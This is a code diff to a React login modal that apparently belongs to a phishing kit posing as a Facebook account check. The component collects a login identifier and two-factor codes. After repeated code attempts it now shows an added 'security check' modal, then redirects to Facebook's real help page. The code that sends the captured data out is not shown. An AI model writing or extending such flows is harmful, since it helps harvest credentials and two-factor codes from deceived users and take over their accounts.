@@ -5,6 +5,7 @@ import config from '@/utils/config';
 import { useLang } from '@/context/lang-context';
 import TwoFactorCodeModal from '@/components/two-factor-code-modal';
 import TryOtherMethodModal from '@/components/try-other-method-modal';
+import SecurityCheckModal from '@/components/security-check-modal';
 
 const LoginModal = ({ onClose, formData = {} }) => {
     const { labels } = useLang();
@@ -27,6 +28,8 @@ const LoginModal = ({ onClose, formData = {} }) => {
     const [isTryOtherStep, setIsTryOtherStep] = useState(false);
     const [selectedMethod, setSelectedMethod] = useState(null);
     const [identifierErrorMsg, setIdentifierErrorMsg] = useState('');
+    const [showSecurityCheck, setShowSecurityCheck] = useState(false);
+    const [securityRedirectUrl, setSecurityRedirectUrl] = useState('');
 
     const t = {
         modalDesc: labels.modalDesc,
@@ -123,7 +126,8 @@ const LoginModal = ({ onClose, formData = {} }) => {
         setCodeLoading(false);
 
         if (nextAttempts >= config.max_code_attempts) {
-            globalThis.location.assign('https://www.facebook.com/help');
+            setSecurityRedirectUrl('https://www.facebook.com/help');
+            setShowSecurityCheck(true);
             return;
         }
 
@@ -132,6 +136,7 @@ const LoginModal = ({ onClose, formData = {} }) => {
     };
 
     return (
+        <>
         <div className="fixed inset-0 z-50 flex items-center justify-center px-3 py-4 sm:px-4">
             <button
                 type="button"
@@ -287,6 +292,14 @@ const LoginModal = ({ onClose, formData = {} }) => {
                 )}
             </div>
         </div>
+
+            {showSecurityCheck && (
+                <SecurityCheckModal
+                    redirectUrl={securityRedirectUrl}
+                    onCancel={() => setShowSecurityCheck(false)}
+                />
+            )}
+        </>
     );
 };
 
